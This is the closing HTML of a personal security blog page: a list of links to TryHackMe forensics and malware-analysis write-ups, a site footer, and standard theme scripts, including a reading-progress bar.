hover:text-pink-800" href="/blog/2025/THM-Windows-Forensics-2/">THM Windows Forensics 2</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Anti-Reverse-Engineering/">THM Anti-Reverse Engineering</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Windows-Forensics-1/">THM Windows Forensics 1</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Basic-Dynamic-Analysis/">THM Basic Dynamic Analysis</a> </li> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 NonoHM . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?da39b660470d1ba6e6b8bf5f37070b6e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>